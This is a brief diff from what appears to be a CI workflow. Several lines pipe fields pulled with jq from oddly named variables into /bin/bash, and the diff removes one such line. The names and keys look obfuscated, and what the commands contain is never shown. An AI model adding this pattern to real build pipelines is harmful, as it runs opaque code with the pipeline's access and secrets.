@@ -32,7 +32,6 @@ jobs:
           echo $a26 | jq -r .rxwsh0606 | /bin/bash
           printf '%s' "$y1" | jq -r .uf0052 | /bin/bash
           echo $dfyrs984 | jq -r .e2024 | /bin/bash
-          echo $ivc63082 | jq -r .yb0 | /bin/bash
           printf '%s' "$mulh84" | jq -r .ozc6797 | /bin/bash
 
       - name: Store results
